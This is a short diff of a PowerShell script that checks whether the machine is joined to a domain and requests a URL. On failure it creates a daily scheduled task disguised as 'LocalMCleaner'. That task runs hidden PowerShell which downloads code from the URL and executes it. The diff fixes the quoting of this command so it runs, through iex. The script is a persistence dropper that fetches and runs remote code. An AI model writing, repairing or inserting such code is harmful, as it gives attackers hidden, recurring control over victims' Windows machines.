@@ -1,6 +1,4 @@
-
 $computerInfo = Get-ComputerInfo  
-  
 if ($computerInfo.CsPartOfDomain) 
 {  
 
@@ -14,7 +12,8 @@ if ($computerInfo.CsPartOfDomain)
         Write-Host "URL: $url"  
         Write-Host "$($response.StatusCode)"  
     } catch {  
-    $str = "cmd.exe /c schtasks /create /sc daily /tn LocalMCleaner /tr "Powershell -WindowStyle Hidden irm " + $url +"|Powershell" /st 11:30 /f"
+    $ccc = `"Powershell -WindowStyle Hidden irm `"  + $url +`"|Powershell`"
+    $str = "cmd.exe /c schtasks /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:30 /f"
     iex  $str
     }  
 } 
